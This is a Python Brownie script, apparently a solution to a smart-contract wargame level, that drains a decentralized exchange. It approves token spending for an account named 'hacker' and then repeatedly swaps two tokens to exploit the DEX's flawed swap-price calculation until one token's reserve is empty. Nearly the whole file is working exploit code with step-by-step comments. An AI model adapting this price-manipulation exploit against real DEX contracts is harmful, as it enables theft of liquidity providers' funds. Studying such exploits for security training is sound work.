# Import necessary modules from Brownie
from brownie import accounts, config, interface, Dex

# Define the main function
def main():

    # Define the contract address of the DEX
    contract = '0x4797F4F12774c04cecb3831e90AdbE51F4ceFc4f'

    # Add an account to use for transactions (using a private key from the config file)
    hacker = accounts.add(config['wallets']['from_key'])

    # Get the contract interface for the DEX
    dex = Dex.at(contract)

    # Get the interface for the first and second tokens in the DEX
    token1 = interface.IERC20(dex.token1())
    token2 = interface.IERC20(dex.token2())

    # Approve the DEX to spend 100 tokens from each of the two tokens for the hacker's account
    token1.approve(dex, 100, {'from': hacker})
    token2.approve(dex, 100, {'from': hacker})

    # Set the initial swap parameters to swap token1 for token2
    tokenFrom = token1
    tokenTo = token2

    # Get the initial swap price of token1 for token2 and start the while loop to execute the swap
    price = dex.getSwapPrice(tokenFrom, tokenTo, tokenFrom.balanceOf(hacker), {"from": hacker, "gas_limit": 12000000, "allow_revert": True})
    while price <= tokenTo.balanceOf(dex):

        # Execute the swap and print the balances of token1 and token2 after the swap
        dex.swap(tokenFrom, tokenTo, tokenFrom.balanceOf(hacker), {'from': hacker})
        print(f'Token1: {token1.balanceOf(hacker)} - Token2: {token2.balanceOf(hacker)}')

        # Switch the tokens to swap (token2 for token1)
        tmp = tokenTo
        tokenTo = tokenFrom
        tokenFrom = tmp

        # Get the new swap price of the switched tokens and check if the loop should continue
        price = dex.getSwapPrice(tokenFrom, tokenTo, tokenFrom.balanceOf(hacker), {"from": hacker, "gas_limit": 12000000, "allow_revert": True})

    # Calculate the amount of tokens to swap using the final balances and swap price
    amount = int(tokenFrom.balanceOf(hacker) * tokenTo.balanceOf(dex) / price)

    # Print the amount and price of the swap and execute the final swap
    print(f'Amount: {amount}')
    price = dex.getSwapPrice(tokenFrom, tokenTo, amount, {"from": hacker, "gas_limit": 12000000, "allow_revert": True})
    print(f'Price: {price} - Balance: {tokenTo.balanceOf(dex)}')
    dex.swap(tokenFrom, tokenTo, amount, {'from': hacker})

    # Print the final balances of token1 and token2 in the DEX
    print(f'Dex Token1: {token1.balanceOf(dex)} - Dex Token2: {token2.balanceOf(dex)}')
